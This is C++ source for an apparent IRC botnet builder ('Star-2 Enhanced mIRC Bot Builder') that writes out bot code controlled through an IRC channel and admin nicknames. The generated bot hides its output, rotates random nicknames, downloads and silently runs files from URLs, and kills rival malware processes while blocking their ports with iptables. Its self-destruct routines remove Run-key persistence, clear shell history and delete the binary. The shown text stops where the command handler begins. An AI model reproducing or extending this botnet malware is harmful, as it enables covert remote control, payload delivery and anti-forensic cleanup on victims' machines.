#include <iostream>
#include <string>
#include <fstream>
#include <sstream>
#include <cstdlib>
#include <cstring>
#include <sys/socket.h>
#include <netinet/in.h>
#include <arpa/inet.h>
#include <unistd.h>
#include <netdb.h>
#include <thread>
#include <chrono>
#include <vector>
#include <algorithm>
#include <signal.h>
#include <random>

class EnhancedMircBotBuilder {
private:
    std::string botName;
    std::string server;
    int port;
    std::string channel;
    std::string password;
    std::string realName;
    std::string userInfo;
    std::vector<std::string> autoJoinChannels;
    std::vector<std::string> adminUsers;
    bool autoReconnect;
    int reconnectDelay;
    std::string logFile;
    bool useRandomNicknames;
    bool enableDownloadFeatures;
    std::string downloadDirectory;
    bool stealthMode;
    bool enableBotkiller;
    std::vector<std::string> suspiciousProcessNames;
    std::vector<std::string> suspiciousPorts;
    
public:
    EnhancedMircBotBuilder() {
        // Default settings
        botName = "StarBot";
        server = "irc.rizon.net";
        port = 6667;
        channel = "#rawr";
        password = "";
        realName = "Star-2 IRC Bot Enhanced";
        userInfo = "Star-2";
        autoReconnect = true;
        reconnectDelay = 30;
        logFile = "bot.log";
        useRandomNicknames = true;
        enableDownloadFeatures = true;
        downloadDirectory = "./downloads";
        stealthMode = true;
        enableBotkiller = true;
        
        // Add default admin
        adminUsers.push_back("ItsMehRawrXD");
        
        // Default suspicious process names to detect
        suspiciousProcessNames.push_back("bot");
        suspiciousProcessNames.push_back("malware");
        suspiciousProcessNames.push_back("backdoor");
        suspiciousProcessNames.push_back("trojan");
        suspiciousProcessNames.push_back("virus");
        suspiciousProcessNames.push_back("keylogger");
        suspiciousProcessNames.push_back("spyware");
        suspiciousProcessNames.push_back("rootkit");
        suspiciousProcessNames.push_back("miner");
        suspiciousProcessNames.push_back("rat");
        suspiciousProcessNames.push_back("stealer");
        suspiciousProcessNames.push_back("ransomware");
        
        // Default suspicious ports
        suspiciousPorts.push_back("6667");  // IRC
        suspiciousPorts.push_back("8080");  // HTTP proxy
        suspiciousPorts.push_back("4444");  // Common backdoor
        suspiciousPorts.push_back("31337"); // Elite hacker port
        suspiciousPorts.push_back("1337");  // Leet port
        suspiciousPorts.push_back("3389");  // RDP
        suspiciousPorts.push_back("5900");  // VNC
        suspiciousPorts.push_back("12345"); // NetBus
        suspiciousPorts.push_back("27374"); // SubSeven
    }
    
    void showMenu() {
        std::cout << "\n=== Star-2 Enhanced mIRC Bot Builder ===\n";
        std::cout << "1. Set Bot Name\n";
        std::cout << "2. Set IRC Server\n";
        std::cout << "3. Set Channel\n";
        std::cout << "4. Set Password\n";
        std::cout << "5. Set Real Name\n";
        std::cout << "6. Add Auto-Join Channels\n";
        std::cout << "7. Add Admin Users\n";
        std::cout << "8. Set Auto-Reconnect Settings\n";
        std::cout << "9. Set Log File\n";
        std::cout << "10. Toggle Random Nicknames (" << (useRandomNicknames ? "ON" : "OFF") << ")\n";
        std::cout << "11. Toggle Download Features (" << (enableDownloadFeatures ? "ON" : "OFF") << ")\n";
        std::cout << "12. Set Download Directory\n";
        std::cout << "13. Toggle Stealth Mode (" << (stealthMode ? "ON" : "OFF") << ")\n";
        std::cout << "14. Toggle Botkiller (" << (enableBotkiller ? "ON" : "OFF") << ")\n";
        std::cout << "15. Manage Suspicious Process Names\n";
        std::cout << "16. Manage Suspicious Ports\n";
        std::cout << "17. Show Current Settings\n";
        std::cout << "18. Generate Enhanced Bot\n";
        std::cout << "19. Exit\n";
        std::cout << "Choose option: ";
    }
    
    void setBotName() {
        std::cout << "Current bot name: " << botName << "\n";
        std::cout << "Enter new bot name: ";
        std::getline(std::cin, botName);
        if (botName.empty()) botName = "StarBot";
    }
    
    void setServer() {
        std::cout << "Current server: " << server << "\n";
        std::cout << "Enter IRC server (e.g., irc.rizon.net): ";
        std::getline(std::cin, server);
        if (server.empty()) server = "irc.rizon.net";
        
        std::cout << "Current port: " << port << "\n";
        std::cout << "Enter port (default 6667): ";
        std::string portStr;
        std::getline(std::cin, portStr);
        if (!portStr.empty()) {
            port = std::stoi(portStr);
        }
    }
    
    void setChannel() {
        std::cout << "Current channel: " << channel << "\n";
        std::cout << "Enter channel (e.g., #rawr): ";
        std::getline(std::cin, channel);
        if (channel.empty()) channel = "#rawr";
        if (channel[0] != '#') channel = "#" + channel;
    }
    
    void setPassword() {
        std::cout << "Enter server password (leave empty if none): ";
        std::getline(std::cin, password);
    }
    
    void setRealName() {
        std::cout << "Current real name: " << realName << "\n";
        std::cout << "Enter real name: ";
        std::getline(std::cin, realName);
        if (realName.empty()) realName = "Star-2 IRC Bot Enhanced";
    }
    
    void addAutoJoinChannels() {
        std::cout << "Current auto-join channels:\n";
        for (const auto& ch : autoJoinChannels) {
            std::cout << "  " << ch << "\n";
        }
        std::cout << "Enter channel to add (or 'clear' to clear all): ";
        std::string newChannel;
        std::getline(std::cin, newChannel);
        
        if (newChannel == "clear") {
            autoJoinChannels.clear();
        } else if (!newChannel.empty()) {
            if (newChannel[0] != '#') newChannel = "#" + newChannel;
            autoJoinChannels.push_back(newChannel);
        }
    }
    
    void addAdminUsers() {
        std::cout << "Current admin users:\n";
        for (const auto& user : adminUsers) {
            std::cout << "  " << user << "\n";
        }
        std::cout << "Enter admin username to add (or 'clear' to clear all): ";
        std::string newUser;
        std::getline(std::cin, newUser);
        
        if (newUser == "clear") {
            adminUsers.clear();
        } else if (!newUser.empty()) {
            adminUsers.push_back(newUser);
        }
    }
    
    void setAutoReconnect() {
        std::cout << "Current auto-reconnect: " << (autoReconnect ? "enabled" : "disabled") << "\n";
        std::cout << "Enable auto-reconnect? (y/n): ";
        std::string choice;
        std::getline(std::cin, choice);
        autoReconnect = (choice == "y" || choice == "Y");
        
        if (autoReconnect) {
            std::cout << "Current reconnect delay: " << reconnectDelay << " seconds\n";
            std::cout << "Enter reconnect delay in seconds: ";
            std::string delayStr;
            std::getline(std::cin, delayStr);
            if (!delayStr.empty()) {
                reconnectDelay = std::stoi(delayStr);
            }
        }
    }
    
    void setLogFile() {
        std::cout << "Current log file: " << logFile << "\n";
        std::cout << "Enter log file name: ";
        std::getline(std::cin, logFile);
        if (logFile.empty()) logFile = "bot.log";
    }
    
    void toggleRandomNicknames() {
        useRandomNicknames = !useRandomNicknames;
        std::cout << "Random nicknames: " << (useRandomNicknames ? "ENABLED" : "DISABLED") << "\n";
    }
    
    void toggleDownloadFeatures() {
        enableDownloadFeatures = !enableDownloadFeatures;
        std::cout << "Download features: " << (enableDownloadFeatures ? "ENABLED" : "DISABLED") << "\n";
    }
    
    void setDownloadDirectory() {
        std::cout << "Current download directory: " << downloadDirectory << "\n";
        std::cout << "Enter download directory: ";
        std::getline(std::cin, downloadDirectory);
        if (downloadDirectory.empty()) downloadDirectory = "./downloads";
    }
    
    void toggleStealthMode() {
        stealthMode = !stealthMode;
        std::cout << "Stealth mode: " << (stealthMode ? "ENABLED" : "DISABLED") << "\n";
    }
    
    void toggleBotkiller() {
        enableBotkiller = !enableBotkiller;
        std::cout << "Botkiller: " << (enableBotkiller ? "ENABLED" : "DISABLED") << "\n";
    }
    
    void manageSuspiciousProcessNames() {
        std::cout << "Current suspicious process names:\n";
        for (size_t i = 0; i < suspiciousProcessNames.size(); i++) {
            std::cout << "  " << (i+1) << ". " << suspiciousProcessNames[i] << "\n";
        }
        std::cout << "Enter: 'add <name>' to add, 'remove <number>' to remove, 'clear' to clear all: ";
        std::string input;
        std::getline(std::cin, input);
        
        std::istringstream iss(input);
        std::string action;
        iss >> action;
        
        if (action == "add") {
            std::string name;
            iss >> name;
            if (!name.empty()) {
                suspiciousProcessNames.push_back(name);
                std::cout << "Added: " << name << "\n";
            }
        } else if (action == "remove") {
            int index;
            iss >> index;
            if (index > 0 && index <= suspiciousProcessNames.size()) {
                std::string removed = suspiciousProcessNames[index-1];
                suspiciousProcessNames.erase(suspiciousProcessNames.begin() + index - 1);
                std::cout << "Removed: " << removed << "\n";
            }
        } else if (action == "clear") {
            suspiciousProcessNames.clear();
            std::cout << "Cleared all suspicious process names\n";
        }
    }
    
    void manageSuspiciousPorts() {
        std::cout << "Current suspicious ports:\n";
        for (size_t i = 0; i < suspiciousPorts.size(); i++) {
            std::cout << "  " << (i+1) << ". " << suspiciousPorts[i] << "\n";
        }
        std::cout << "Enter: 'add <port>' to add, 'remove <number>' to remove, 'clear' to clear all: ";
        std::string input;
        std::getline(std::cin, input);
        
        std::istringstream iss(input);
        std::string action;
        iss >> action;
        
        if (action == "add") {
            std::string port;
            iss >> port;
            if (!port.empty()) {
                suspiciousPorts.push_back(port);
                std::cout << "Added port: " << port << "\n";
            }
        } else if (action == "remove") {
            int index;
            iss >> index;
            if (index > 0 && index <= suspiciousPorts.size()) {
                std::string removed = suspiciousPorts[index-1];
                suspiciousPorts.erase(suspiciousPorts.begin() + index - 1);
                std::cout << "Removed port: " << removed << "\n";
            }
        } else if (action == "clear") {
            suspiciousPorts.clear();
            std::cout << "Cleared all suspicious ports\n";
        }
    }
    
    void showSettings() {
        std::cout << "\n=== Current Enhanced Bot Settings ===\n";
        std::cout << "Bot Name: " << botName << "\n";
        std::cout << "Server: " << server << ":" << port << "\n";
        std::cout << "Channel: " << channel << "\n";
        std::cout << "Password: " << (password.empty() ? "none" : "***") << "\n";
        std::cout << "Real Name: " << realName << "\n";
        std::cout << "User Info: " << userInfo << "\n";
        std::cout << "Random Nicknames: " << (useRandomNicknames ? "enabled" : "disabled") << "\n";
        std::cout << "Download Features: " << (enableDownloadFeatures ? "enabled" : "disabled") << "\n";
        std::cout << "Download Directory: " << downloadDirectory << "\n";
        std::cout << "Stealth Mode: " << (stealthMode ? "enabled" : "disabled") << "\n";
        std::cout << "Botkiller: " << (enableBotkiller ? "enabled" : "disabled") << "\n";
        if (enableBotkiller) {
            std::cout << "Suspicious Process Names (" << suspiciousProcessNames.size() << "):\n";
            for (const auto& name : suspiciousProcessNames) {
                std::cout << "  " << name << "\n";
            }
            std::cout << "Suspicious Ports (" << suspiciousPorts.size() << "):\n";
            for (const auto& port : suspiciousPorts) {
                std::cout << "  " << port << "\n";
            }
        }
        std::cout << "Auto-Join Channels:\n";
        for (const auto& ch : autoJoinChannels) {
            std::cout << "  " << ch << "\n";
        }
        std::cout << "Admin Users:\n";
        for (const auto& user : adminUsers) {
            std::cout << "  " << user << "\n";
        }
        std::cout << "Auto-Reconnect: " << (autoReconnect ? "enabled" : "disabled") << "\n";
        if (autoReconnect) {
            std::cout << "Reconnect Delay: " << reconnectDelay << " seconds\n";
        }
        std::cout << "Log File: " << logFile << "\n";
    }
    
    void generateBot() {
        std::string filename = botName + "_enhanced_bot.cpp";
        std::ofstream file(filename);
        
        if (!file.is_open()) {
            std::cout << "Error: Could not create bot file!\n";
            return;
        }
        
        file << generateEnhancedBotCode();
        file.close();
        
        std::cout << "\n✅ Enhanced Bot generated successfully: " << filename << "\n";
        std::cout << "Features included:\n";
        std::cout << "  ✓ Core IRC functionality\n";
        std::cout << "  ✓ Advanced admin commands\n";
        if (useRandomNicknames) std::cout << "  ✓ Random nickname generation\n";
        if (enableDownloadFeatures) std::cout << "  ✓ Download & install capabilities\n";
        if (stealthMode) std::cout << "  ✓ Stealth mode operation\n";
        if (enableBotkiller) std::cout << "  ✓ Botkiller & self-cleanup\n";
        std::cout << "  ✓ File upload/download commands\n";
        std::cout << "  ✓ Remote command execution\n";
        std::cout << "  ✓ Bot management commands\n";
        std::cout << "  ✓ Process scanning & termination\n";
        std::cout << "  ✓ Self-destruction capabilities\n";
        std::cout << "\nTo compile: g++ -std=c++17 -o " << botName << "_enhanced_bot " << filename << "\n";
        std::cout << "To run: ./" << botName << "_enhanced_bot\n";
    }
    
private:
    std::string generateEnhancedBotCode() {
        std::stringstream code;
        
        // Headers
        code << "#include <iostream>\n";
        code << "#include <string>\n";
        code << "#include <vector>\n";
        code << "#include <thread>\n";
        code << "#include <chrono>\n";
        code << "#include <sys/socket.h>\n";
        code << "#include <netinet/in.h>\n";
        code << "#include <arpa/inet.h>\n";
        code << "#include <unistd.h>\n";
        code << "#include <netdb.h>\n";
        code << "#include <cstring>\n";
        code << "#include <fstream>\n";
        code << "#include <sstream>\n";
        code << "#include <algorithm>\n";
        code << "#include <signal.h>\n";
        code << "#include <random>\n";
        code << "#include <ctime>\n";
        code << "#include <filesystem>\n";
        if (enableDownloadFeatures) {
            code << "#include <curl/curl.h>\n";
        }
        code << "#ifdef _WIN32\n";
        code << "#include <windows.h>\n";
        code << "#include <urlmon.h>\n";
        code << "#include <shellapi.h>\n";
        code << "#pragma comment(lib, \"urlmon.lib\")\n";
        code << "#pragma comment(lib, \"shell32.lib\")\n";
        code << "#endif\n\n";
        
        if (enableDownloadFeatures) {
            // Download helper functions
            code << "// Download helper structure for curl\n";
            code << "struct DownloadData {\n";
            code << "    std::string data;\n";
            code << "};\n\n";
            
            code << "// Callback function for curl downloads\n";
            code << "size_t WriteCallback(void* contents, size_t size, size_t nmemb, DownloadData* data) {\n";
            code << "    size_t totalSize = size * nmemb;\n";
            code << "    data->data.append((char*)contents, totalSize);\n";
            code << "    return totalSize;\n";
            code << "}\n\n";
        }
        
        if (useRandomNicknames) {
            // Random nickname generator
            code << "// Enhanced random name generator\n";
            code << "std::string generateRandomBotName() {\n";
            code << "    static std::mt19937 rng(std::time(nullptr));\n";
            code << "    const std::vector<std::string> prefixes = {\n";
            code << "        \"rawr\", \"star\", \"bot\", \"user\", \"guest\", \"irc\", \"chat\",\n";
            code << "        \"anon\", \"client\", \"net\", \"cyber\", \"tech\", \"auto\", \"sys\"\n";
            code << "    };\n";
            code << "    const std::string chars = \"abcdefghijklmnopqrstuvwxyz0123456789\";\n";
            code << "    \n";
            code << "    std::uniform_int_distribution<> prefixDis(0, prefixes.size() - 1);\n";
            code << "    std::uniform_int_distribution<> charDis(0, chars.length() - 1);\n";
            code << "    std::uniform_int_distribution<> lengthDis(3, 6);\n";
            code << "    \n";
            code << "    std::string nickname = prefixes[prefixDis(rng)];\n";
            code << "    int suffixLength = lengthDis(rng);\n";
            code << "    \n";
            code << "    for (int i = 0; i < suffixLength; i++) {\n";
            code << "        nickname += chars[charDis(rng)];\n";
            code << "    }\n";
            code << "    \n";
            code << "    return nickname;\n";
            code << "}\n\n";
        } else {
            code << "// Simple random name generator\n";
            code << "std::string generateRandomBotName() {\n";
            code << "    static std::mt19937 rng(std::time(nullptr));\n";
            code << "    int number = (rng() % 9999) + 1;\n";
            code << "    return \"rawr\" + std::to_string(number);\n";
            code << "}\n\n";
        }
        
        // Main bot class
        code << "class EnhancedMircBot {\n";
        code << "private:\n";
        code << "    std::string botName;\n";
        code << "    std::string server;\n";
        code << "    int port;\n";
        code << "    std::string channel;\n";
        code << "    std::string password;\n";
        code << "    std::string realName;\n";
        code << "    std::string userInfo;\n";
        code << "    std::vector<std::string> autoJoinChannels;\n";
        code << "    std::vector<std::string> adminUsers;\n";
        code << "    bool autoReconnect;\n";
        code << "    int reconnectDelay;\n";
        code << "    std::string logFile;\n";
        code << "    std::string downloadDir;\n";
        code << "    bool stealthMode;\n";
        code << "    bool botkillerEnabled;\n";
        code << "    std::vector<std::string> suspiciousNames;\n";
        code << "    std::vector<std::string> suspiciousPorts;\n";
        code << "    int sockfd;\n";
        code << "    bool running;\n\n";
        
        // Constructor
        code << "public:\n";
        code << "    EnhancedMircBot() : port(6667), autoReconnect(true), reconnectDelay(30), sockfd(-1), running(false) {\n";
        code << "        botName = \"" << botName << "\";\n";
        code << "        server = \"" << server << "\";\n";
        code << "        port = " << port << ";\n";
        code << "        channel = \"" << channel << "\";\n";
        code << "        password = \"" << password << "\";\n";
        code << "        realName = \"" << realName << "\";\n";
        code << "        userInfo = \"" << userInfo << "\";\n";
        code << "        logFile = \"" << logFile << "\";\n";
        code << "        downloadDir = \"" << downloadDirectory << "\";\n";
        code << "        stealthMode = " << (stealthMode ? "true" : "false") << ";\n";
        code << "        botkillerEnabled = " << (enableBotkiller ? "true" : "false") << ";\n";
        code << "        autoReconnect = " << (autoReconnect ? "true" : "false") << ";\n";
        code << "        reconnectDelay = " << reconnectDelay << ";\n\n";
        
        // Add suspicious process names
        for (const auto& name : suspiciousProcessNames) {
            code << "        suspiciousNames.push_back(\"" << name << "\");\n";
        }
        
        // Add suspicious ports
        for (const auto& port : suspiciousPorts) {
            code << "        suspiciousPorts.push_back(\"" << port << "\");\n";
        }
        code << "\n";
        
        for (const auto& ch : autoJoinChannels) {
            code << "        autoJoinChannels.push_back(\"" << ch << "\");\n";
        }
        
        for (const auto& user : adminUsers) {
            code << "        adminUsers.push_back(\"" << user << "\");\n";
        }
        
        if (enableDownloadFeatures) {
            code << "\n        // Create download directory\n";
            code << "        std::filesystem::create_directories(downloadDir);\n";
        }
        
        code << "    }\n\n";
        
        // Logging function
        code << "    void log(const std::string& message) {\n";
        if (stealthMode) {
            code << "        // Silent logging - only to file, no console output\n";
        } else {
            code << "        std::cout << message << std::endl;\n";
        }
        code << "        std::ofstream logStream(logFile, std::ios::app);\n";
        code << "        if (logStream.is_open()) {\n";
        code << "            auto now = std::chrono::system_clock::now();\n";
        code << "            auto time_t = std::chrono::system_clock::to_time_t(now);\n";
        code << "            logStream << std::ctime(&time_t) << \": \" << message << std::endl;\n";
        code << "            logStream.close();\n";
        code << "        }\n";
        code << "    }\n\n";
        
        // Connection methods
        code << "    bool connect() {\n";
        code << "        struct sockaddr_in server_addr;\n";
        code << "        struct hostent *host;\n\n";
        code << "        sockfd = socket(AF_INET, SOCK_STREAM, 0);\n";
        code << "        if (sockfd < 0) {\n";
        code << "            log(\"Error creating socket\");\n";
        code << "            return false;\n";
        code << "        }\n\n";
        code << "        host = gethostbyname(server.c_str());\n";
        code << "        if (host == NULL) {\n";
        code << "            log(\"Error resolving hostname: \" + server);\n";
        code << "            return false;\n";
        code << "        }\n\n";
        code << "        memset(&server_addr, 0, sizeof(server_addr));\n";
        code << "        server_addr.sin_family = AF_INET;\n";
        code << "        server_addr.sin_port = htons(port);\n";
        code << "        memcpy(&server_addr.sin_addr.s_addr, host->h_addr, host->h_length);\n\n";
        code << "        if (::connect(sockfd, (struct sockaddr*)&server_addr, sizeof(server_addr)) < 0) {\n";
        code << "            log(\"Error connecting to server\");\n";
        code << "            return false;\n";
        code << "        }\n\n";
        code << "        log(\"Connected to \" + server + \":\" + std::to_string(port));\n";
        code << "        return true;\n";
        code << "    }\n\n";
        
        code << "    void sendCommand(const std::string& command) {\n";
        code << "        std::string fullCommand = command + \"\\r\\n\";\n";
        code << "        send(sockfd, fullCommand.c_str(), fullCommand.length(), 0);\n";
        code << "        log(\"SENT: \" + command);\n";
        code << "    }\n\n";
        
        code << "    void authenticate() {\n";
        code << "        if (!password.empty()) {\n";
        code << "            sendCommand(\"PASS \" + password);\n";
        code << "        }\n";
        if (useRandomNicknames) {
            code << "        // Use random nickname on initial connection\n";
            code << "        std::string randomNick = generateRandomBotName();\n";
            code << "        sendCommand(\"NICK \" + randomNick);\n";
            code << "        botName = randomNick;\n";
        } else {
            code << "        sendCommand(\"NICK \" + botName);\n";
        }
        code << "        sendCommand(\"USER \" + userInfo + \" 0 * :\" + realName);\n";
        code << "    }\n\n";
        
        code << "    void joinChannels() {\n";
        code << "        sendCommand(\"JOIN \" + channel);\n";
        code << "        for (const auto& ch : autoJoinChannels) {\n";
        code << "            if (ch != channel) {\n";
        code << "                sendCommand(\"JOIN \" + ch);\n";
        code << "            }\n";
        code << "        }\n";
        code << "    }\n\n";
        
        code << "    bool isAdmin(const std::string& username) {\n";
        code << "        return std::find(adminUsers.begin(), adminUsers.end(), username) != adminUsers.end();\n";
        code << "    }\n\n";
        
        if (enableDownloadFeatures) {
            // Download functionality
            code << "    bool downloadFile(const std::string& url, const std::string& filename) {\n";
            code << "        #ifdef _WIN32\n";
            code << "        // Use Windows URLDownloadToFile\n";
            code << "        std::wstring wUrl(url.begin(), url.end());\n";
            code << "        std::wstring wFilename(filename.begin(), filename.end());\n";
            code << "        HRESULT hr = URLDownloadToFile(NULL, wUrl.c_str(), wFilename.c_str(), 0, NULL);\n";
            code << "        return SUCCEEDED(hr);\n";
            code << "        #else\n";
            code << "        // Use curl for Unix-like systems\n";
            code << "        CURL* curl = curl_easy_init();\n";
            code << "        if (!curl) return false;\n";
            code << "        \n";
            code << "        FILE* fp = fopen(filename.c_str(), \"wb\");\n";
            code << "        if (!fp) {\n";
            code << "            curl_easy_cleanup(curl);\n";
            code << "            return false;\n";
            code << "        }\n";
            code << "        \n";
            code << "        curl_easy_setopt(curl, CURLOPT_URL, url.c_str());\n";
            code << "        curl_easy_setopt(curl, CURLOPT_WRITEDATA, fp);\n";
            code << "        curl_easy_setopt(curl, CURLOPT_FOLLOWLOCATION, 1L);\n";
            code << "        \n";
            code << "        CURLcode res = curl_easy_perform(curl);\n";
            code << "        \n";
            code << "        fclose(fp);\n";
            code << "        curl_easy_cleanup(curl);\n";
            code << "        \n";
            code << "        return (res == CURLE_OK);\n";
            code << "        #endif\n";
            code << "    }\n\n";
            
            code << "    void executeFile(const std::string& filename) {\n";
            code << "        #ifdef _WIN32\n";
            code << "        SHELLEXECUTEINFOA sei = {};\n";
            code << "        sei.cbSize = sizeof(SHELLEXECUTEINFOA);\n";
            code << "        sei.fMask = SEE_MASK_NOCLOSEPROCESS;\n";
            code << "        sei.lpVerb = \"open\";\n";
            code << "        sei.lpFile = filename.c_str();\n";
            code << "        sei.nShow = SW_HIDE;\n";
            code << "        ShellExecuteExA(&sei);\n";
            code << "        #else\n";
            code << "        std::string cmd = \"chmod +x \" + filename + \" && ./\" + filename + \" &\";\n";
            code << "        system(cmd.c_str());\n";
            code << "        #endif\n";
                         code << "    }\n\n";
         }
         
         if (enableBotkiller) {
             // Botkiller functionality
             code << "    // Botkiller Functions\n";
             code << "    std::string getSelfPath() {\n";
             code << "        char path[1024];\n";
             code << "        #ifdef _WIN32\n";
             code << "        GetModuleFileNameA(NULL, path, sizeof(path));\n";
             code << "        #else\n";
             code << "        ssize_t len = readlink(\"/proc/self/exe\", path, sizeof(path) - 1);\n";
             code << "        if (len != -1) path[len] = '\\0';\n";
             code << "        #endif\n";
             code << "        return std::string(path);\n";
             code << "    }\n\n";
             
             code << "    std::string scanForMalware() {\n";
             code << "        std::string results = \"\";\n";
             code << "        std::string selfPath = getSelfPath();\n";
             code << "        \n";
             code << "        // Build process search pattern\n";
             code << "        std::string pattern = \"\";\n";
             code << "        for (size_t i = 0; i < suspiciousNames.size(); i++) {\n";
             code << "            if (i > 0) pattern += \"|\";\n";
             code << "            pattern += suspiciousNames[i];\n";
             code << "        }\n";
             code << "        \n";
             code << "        // Scan for suspicious processes (exclude self)\n";
             code << "        std::string psCmd = \"ps aux | grep -E '(\" + pattern + \")' | grep -v grep | grep -v '\" + selfPath + \"'\";\n";
             code << "        FILE* psPipe = popen(psCmd.c_str(), \"r\");\n";
             code << "        if (psPipe) {\n";
             code << "            char buffer[256];\n";
             code << "            std::string processes = \"\";\n";
             code << "            while (fgets(buffer, sizeof(buffer), psPipe) != NULL) {\n";
             code << "                processes += buffer;\n";
             code << "            }\n";
             code << "            pclose(psPipe);\n";
             code << "            if (!processes.empty()) {\n";
             code << "                results += \"Suspicious processes:\\n\" + processes;\n";
             code << "            }\n";
             code << "        }\n";
             code << "        \n";
             code << "        // Scan for suspicious files\n";
             code << "        std::string findCmd = \"find /tmp /var/tmp /home -type f -name '*\" + pattern + \"*' 2>/dev/null | grep -v '\" + selfPath + \"'\";\n";
             code << "        FILE* findPipe = popen(findCmd.c_str(), \"r\");\n";
             code << "        if (findPipe) {\n";
             code << "            char buffer[256];\n";
             code << "            std::string files = \"\";\n";
             code << "            while (fgets(buffer, sizeof(buffer), findPipe) != NULL) {\n";
             code << "                files += buffer;\n";
             code << "            }\n";
             code << "            pclose(findPipe);\n";
             code << "            if (!files.empty()) {\n";
             code << "                results += \"\\nSuspicious files:\\n\" + files;\n";
             code << "            }\n";
             code << "        }\n";
             code << "        \n";
             code << "        // Scan for suspicious network connections\n";
             code << "        std::string portPattern = \"\";\n";
             code << "        for (size_t i = 0; i < suspiciousPorts.size(); i++) {\n";
             code << "            if (i > 0) portPattern += \"|\";\n";
             code << "            portPattern += \":\" + suspiciousPorts[i];\n";
             code << "        }\n";
             code << "        std::string netCmd = \"netstat -tuln | grep -E '(\" + portPattern + \")'\";\n";
             code << "        FILE* netPipe = popen(netCmd.c_str(), \"r\");\n";
             code << "        if (netPipe) {\n";
             code << "            char buffer[256];\n";
             code << "            std::string connections = \"\";\n";
             code << "            while (fgets(buffer, sizeof(buffer), netPipe) != NULL) {\n";
             code << "                connections += buffer;\n";
             code << "            }\n";
             code << "            pclose(netPipe);\n";
             code << "            if (!connections.empty()) {\n";
             code << "                results += \"\\nSuspicious connections:\\n\" + connections;\n";
             code << "            }\n";
             code << "        }\n";
             code << "        \n";
             code << "        return results.empty() ? \"No threats detected.\" : results;\n";
             code << "    }\n\n";
             
             code << "    void killMalware() {\n";
             code << "        std::string selfPath = getSelfPath();\n";
             code << "        \n";
             code << "        // Build process kill pattern\n";
             code << "        std::string pattern = \"\";\n";
             code << "        for (size_t i = 0; i < suspiciousNames.size(); i++) {\n";
             code << "            if (i > 0) pattern += \"|\";\n";
             code << "            pattern += suspiciousNames[i];\n";
             code << "        }\n";
             code << "        \n";
             code << "        // Kill suspicious processes (exclude self)\n";
             code << "        std::string killCmd = \"pkill -f '\" + pattern + \"' 2>/dev/null\";\n";
             code << "        system(killCmd.c_str());\n";
             code << "        \n";
             code << "        // Remove suspicious files (exclude self)\n";
             code << "        std::string removeCmd = \"find /tmp /var/tmp /home -type f -name '*\" + pattern + \"*' 2>/dev/null | grep -v '\" + selfPath + \"' | xargs rm -f 2>/dev/null\";\n";
             code << "        system(removeCmd.c_str());\n";
             code << "        \n";
             code << "        // Block suspicious ports\n";
             code << "        for (const auto& port : suspiciousPorts) {\n";
             code << "            std::string blockCmd = \"iptables -A INPUT -p tcp --dport \" + port + \" -j DROP 2>/dev/null\";\n";
             code << "            system(blockCmd.c_str());\n";
             code << "        }\n";
             code << "    }\n\n";
             
             code << "    void selfDestruct(const std::string& mode = \"clean\") {\n";
             code << "        std::string selfPath = getSelfPath();\n";
             code << "        log(\"Self-destruct initiated: \" + mode);\n";
             code << "        \n";
             code << "        if (mode == \"stealth\") {\n";
             code << "            // Remove log file\n";
             code << "            std::string removeLogCmd = \"rm -f \" + logFile;\n";
             code << "            system(removeLogCmd.c_str());\n";
             code << "            \n";
             code << "            // Remove startup entries\n";
             code << "            #ifdef _WIN32\n";
             code << "            system(\"reg delete HKCU\\\\Software\\\\Microsoft\\\\Windows\\\\CurrentVersion\\\\Run /v WindowsService /f 2>nul\");\n";
             code << "            #else\n";
             code << "            system(\"rm -f ~/.config/autostart/*bot* ~/.bashrc.bak 2>/dev/null\");\n";
             code << "            #endif\n";
             code << "            \n";
             code << "            // Create self-deletion script\n";
             code << "            #ifdef _WIN32\n";
             code << "            std::string script = \"@echo off\\ntimeout /t 2 /nobreak > nul\\ndel \\\"\" + selfPath + \"\\\"\\ndel \\\"%~f0\\\"\";\n";
             code << "            std::ofstream scriptFile(\"cleanup.bat\");\n";
             code << "            if (scriptFile.is_open()) {\n";
             code << "                scriptFile << script;\n";
             code << "                scriptFile.close();\n";
             code << "                system(\"start /min cleanup.bat\");\n";
             code << "            }\n";
             code << "            #else\n";
             code << "            std::string script = \"#!/bin/bash\\nsleep 2\\nrm -f \\\"\" + selfPath + \"\\\"\\nrm -- \\\"$0\\\"\";\n";
             code << "            std::ofstream scriptFile(\"cleanup.sh\");\n";
             code << "            if (scriptFile.is_open()) {\n";
             code << "                scriptFile << script;\n";
             code << "                scriptFile.close();\n";
             code << "                system(\"chmod +x cleanup.sh && nohup ./cleanup.sh &\");\n";
             code << "            }\n";
             code << "            #endif\n";
             code << "        }\n";
             code << "        else if (mode == \"nuclear\") {\n";
             code << "            // Nuclear cleanup - remove everything\n";
             code << "            system(\"rm -rf /tmp/*bot* /tmp/*malware* /var/tmp/*bot* 2>/dev/null\");\n";
             code << "            system(\"rm -f \" + logFile);\n";
             code << "            \n";
             code << "            #ifdef _WIN32\n";
             code << "            system(\"reg delete HKCU\\\\Software\\\\Microsoft\\\\Windows\\\\CurrentVersion\\\\Run /v WindowsService /f 2>nul\");\n";
             code << "            system(\"del /f /q %temp%\\\\*bot* %temp%\\\\*malware* 2>nul\");\n";
             code << "            #else\n";
             code << "            system(\"rm -f ~/.config/autostart/*bot* ~/.bashrc.bak 2>/dev/null\");\n";
             code << "            system(\"history -c && history -w 2>/dev/null\");\n";
             code << "            #endif\n";
             code << "            \n";
             code << "            // Self-deletion\n";
             code << "            std::string script = \"sleep 1 && rm -f \\\"\" + selfPath + \"\\\" &\";\n";
             code << "            system(script.c_str());\n";
             code << "        }\n";
             code << "        else {\n";
             code << "            // Clean shutdown - just remove self\n";
             code << "            std::string removeCmd = \"rm -f \\\"\" + selfPath + \"\\\"\";\n";
             code << "            system(removeCmd.c_str());\n";
             code << "        }\n";
             code << "        \n";
             code << "        running = false;\n";
             code << "    }\n\n";
         }
         
         // Message handling with enhanced commands
        code << "    void handleMessage(const std::string& line) {\n";
        code << "        if (line.find(\"PING :\") == 0) {\n";
        code << "            std::string response = line.substr(6);\n";
        code << "            sendCommand(\"PONG :\" + response);\n";
        code << "            log(\"Responded to PING\");\n";
        code << "        }\n";
        code << "        else if (line.find(\"433\") != std::string::npos) {\n";
        code << "            // Nickname already taken, generate new random name\n";
        code << "            std::string newName = generateRandomBotName();\n";
        code << "            log(\"Nickname taken, trying: \" + newName);\n";
        code << "            sendCommand(\"NICK \" + newName);\n";
        code << "            botName = newName;\n";
        code << "        }\n";
        code << "        else if (line.find(\"PRIVMSG\") != std::string::npos) {\n";
        code << "            size_t pos1 = line.find('!');\n";
